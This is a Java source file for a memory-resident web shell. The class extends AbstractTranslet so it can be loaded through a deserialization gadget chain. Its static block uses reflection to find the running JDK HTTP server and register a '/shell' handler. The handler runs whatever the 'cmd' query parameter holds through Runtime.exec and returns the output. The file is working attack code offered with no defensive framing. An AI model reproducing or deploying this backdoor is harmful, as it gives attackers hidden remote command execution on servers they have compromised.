package com.example.spring.handler;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class InjectHandle extends AbstractTranslet implements HttpHandler {
    static {
        //获取当前线程
        Object o = Thread.currentThread();
        try {
            Field groupField = o.getClass().getDeclaredField("group");
            groupField.setAccessible(true);
            Object group = groupField.get(o);

            Field threadsField = group.getClass().getDeclaredField("threads");
            threadsField.setAccessible(true);
            Object t = threadsField.get(group);

            Thread[] threads = (Thread[]) t;
            for (Thread thread : threads){
                if(thread.getName().equals("Thread-2")){
                    Field targetField = thread.getClass().getDeclaredField("target");
                    targetField.setAccessible(true);
                    Object target = targetField.get(thread);

                    Field thisField = target.getClass().getDeclaredField("this$0");
                    thisField.setAccessible(true);
                    Object this$0 = thisField.get(target);

                    Method createContext = Class.forName("sun.net.httpserver.ServerImpl").getDeclaredMethod("createContext", String.class, HttpHandler.class);
                    createContext.setAccessible(true);
                    createContext.invoke(this$0,"/shell",new InjectHandle());

//                    Field contextsField = this$0.getClass().getDeclaredField("contexts");
//                    contextsField.setAccessible(true);
//                    Object contexts = contextsField.get(this$0);
//
//                    Field listField = contexts.getClass().getDeclaredField("list");
//                    listField.setAccessible(true);
//                    Object lists = listField.get(contexts);
//                    java.util.LinkedList linkedList = (java.util.LinkedList) lists;
//
//                    Object list = linkedList.get(0);
//
//                    Field handlerField = list.getClass().getDeclaredField("handler");
//                    handlerField.setAccessible(true);
//                    handlerField.set(list,new InjectHandle());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void handle(HttpExchange t) throws IOException {
        String response = "MemoryShell";
        String query = t.getRequestURI().getQuery();
        String[] var3 = query.split("=");
        ByteArrayOutputStream output = null;
        if (var3[0].equals("cmd")){
            InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream();
            output = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int n = 0;
            while (-1 != (n = inputStream.read(buffer))) {
                output.write(buffer, 0, n);
            }
        }
        response+=("\n"+new String(output.toByteArray()));
        t.sendResponseHeaders(200, (long)response.length());
        OutputStream os = t.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}